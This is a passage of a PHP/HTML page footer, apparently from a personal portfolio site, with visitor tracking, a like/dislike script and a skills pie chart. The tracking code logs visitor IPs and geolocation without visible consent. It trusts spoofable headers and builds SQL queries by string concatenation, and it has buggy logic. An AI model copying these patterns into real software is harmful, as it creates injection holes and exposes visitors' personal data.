              var x = document.getElementsByTagName('script')[0]; x.parentNode.insertBefore(s, x);
          })();
      </script>
<!-- /GetButton.io widget -->
      <?php
      }
    }  
  ?>
  
  <!-- user data track -->
  <?php

      // country track
      function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
        $output = NULL;
        if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
            $ip = $_SERVER["REMOTE_ADDR"];
            if ($deep_detect) {
                if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                    $ip = $_SERVER['HTTP_CLIENT_IP'];
            }
        }
        $purpose    = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
        $support    = array("country", "countrycode", "state", "region", "city", "location", "address");
        $continents = array(
            "AF" => "Africa",
            "AN" => "Antarctica",
            "AS" => "Asia",
            "EU" => "Europe",
            "OC" => "Australia (Oceania)",
            "NA" => "North America",
            "SA" => "South America"
        );
        if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
            $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
            if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
                switch ($purpose) {
                    case "location":
                        $output = array(
                            "city"           => @$ipdat->geoplugin_city,
                            "state"          => @$ipdat->geoplugin_regionName,
                            "country"        => @$ipdat->geoplugin_countryName,
                            "country_code"   => @$ipdat->geoplugin_countryCode,
                            "continent"      => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
                            "continent_code" => @$ipdat->geoplugin_continentCode
                        );
                        break;
                    case "address":
                        $address = array($ipdat->geoplugin_countryName);
                        if (@strlen($ipdat->geoplugin_regionName) >= 1)
                            $address[] = $ipdat->geoplugin_regionName;
                        if (@strlen($ipdat->geoplugin_city) >= 1)
                            $address[] = $ipdat->geoplugin_city;
                        $output = implode(", ", array_reverse($address));
                        break;
                    case "city":
                        $output = @$ipdat->geoplugin_city;
                        break;
                    case "state":
                        $output = @$ipdat->geoplugin_regionName;
                        break;
                    case "region":
                        $output = @$ipdat->geoplugin_regionName;
                        break;
                    case "country":
                        $output = @$ipdat->geoplugin_countryName;
                        break;
                    case "countrycode":
                        $output = @$ipdat->geoplugin_countryCode;
                        break;
                }
            }
        }
        return $output;
    }

    $visitor_country = ip_info("Visitor", "Country");
    // country track
      // visitors counter
      // new visitor
      $visitors_ip=$_SERVER['REMOTE_ADDR'];
      // check if visitors is unique
      $query= "SELECT * FROM user_data WHERE ip_address='$visitors_ip'";
      $result=mysqli_query($db,$query);
      $total_visitors=mysqli_num_rows($result);
      if($total_visitors<1){

          // visitor browser
    if(strpos( $_SERVER['HTTP_USER_AGENT'], 'Microsoft') !== FALSE) {
      $query= "INSERT INTO user_data (browser) VALUES ('Microsoft Edge')";
      $result=mysqli_query($db,$query);
    }elseif(strpos( $_SERVER['HTTP_USER_AGENT'], 'Chrome') !== FALSE) {
      $query= "INSERT INTO user_data (browser) VALUES ('Chrome')";
      $result=mysqli_query($db,$query);
    }elseif(strpos( $_SERVER['HTTP_USER_AGENT'], 'Trident') !== FALSE) {
      $query= "INSERT INTO user_data (browser) VALUES ('Microsoft Edge')";
      $result=mysqli_query($db,$query);
    }elseif(strpos( $_SERVER['HTTP_USER_AGENT'], 'Firefox') !== FALSE) {
      $query= "INSERT INTO user_data (browser) VALUES ('Firefox')";
      $result=mysqli_query($db,$query);
    }elseif(strpos( $_SERVER['HTTP_USER_AGENT'], 'Safari') !== FALSE) {
      $query= "INSERT INTO user_data (browser) VALUES ('Safari')";
      $result=mysqli_query($db,$query);
    }elseif(strpos( $_SERVER['HTTP_USER_AGENT'], 'Opera') !== FALSE) {
      $query= "INSERT INTO user_data (browser) VALUES ('Opera')";
      $result=mysqli_query($db,$query);
    }else {
      $query= "INSERT INTO user_data (browser) VALUES ('Unidentified')";
      $result=mysqli_query($db,$query);
    }


        $query= "INSERT INTO user_data (ip_address,country) VALUES ('$visitors_ip','$visitor_country')";
        $result=mysqli_query($db,$query);
      
    // close visitors counter



  }
  ?>
  <!-- user data track -->
  <!-- Vendor JS Files -->
  <script src="assets/vendor/purecounter/purecounter_vanilla.js"></script>
  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
  <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
  <script src="assets/vendor/waypoints/noframework.waypoints.js"></script>
  <script src="assets/vendor/php-email-form/validate.js"></script>
  <script src="assets/js/main.js"></script>
  <!-- like dislike -->

  <script>
    function setlikedislike(type,id){
      jQuery.ajax({
        url: 'setlikedislike.php',
        type: 'post',
        data: 'type='+type+'&id='+id,
        success:function(result){
          result=jQuery.parseJSON(result);
          if(result.operation =='like'){
            jQuery('#like_'+id).removeClass('text-white fa-regular');
					  jQuery('#like_'+id).addClass('text-danger fa-solid');
					  jQuery('#dislike_'+id).addClass('text-white fa-regular');
					  jQuery('#dislike_'+id).removeClass('text-danger fa-solid');
          }

          if(result.operation =='unlike'){
            jQuery('#like_'+id).removeClass('text-danger fa-solid');
					  jQuery('#like_'+id).addClass('text-white fa-regular');
          }

          if(result.operation =='dislike'){
            jQuery('#dislike_'+id).removeClass('text-white fa-regular');
					   jQuery('#dislike_'+id).addClass('text-danger fa-solid');
					   jQuery('#like_'+id).addClass('text-white fa-regular');
					   jQuery('#like_'+id).removeClass('text-danger fa-solid');
          }

          if(result.opertion=='undislike'){
					  jQuery('#dislike_'+id).addClass('text-white fa-regular');
					  jQuery('#dislike_'+id).removeClass('text-danger fa-solid');
				  }

          jQuery('#post'+id+' #like').html(result.like_count);
				  jQuery('#post'+id+' #dislike').html(result.dislike_count);
        }
      });
    }
  </script>

<!-- Skil chart -->
<script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>
    <script type="text/javascript">
      google.charts.load("current", {packages:["corechart"]});
      google.charts.setOnLoadCallback(drawChart);
      function drawChart() {
        var data = google.visualization.arrayToDataTable([
          ['Language', 'Speakers (in millions)'],
          <?php
          $query = "SELECT * FROM skill";
          $run = mysqli_query($db, $query);
          while ($sk = mysqli_fetch_array($run)){
          ?>
          ['<?= $sk['skill_name']; ?>', <?= $sk['skill_label']; ?>] , 
          <?php } ?>
        ]);

        var options = {
          title: 'Skils Pie Chart',
          legend: 'none',
          pieSliceText: 'label',
          slices: {  4: {offset: 0.2},
                    12: {offset: 0.3},
                    14: {offset: 0.4},
                    15: {offset: 0.5},
          },
          backgroundColor: 'transparent',
        };

        var chart = new google.visualization.PieChart(document.getElementById('piechart'));
        chart.draw(data, options);
      }
    </script>


</body>
</html>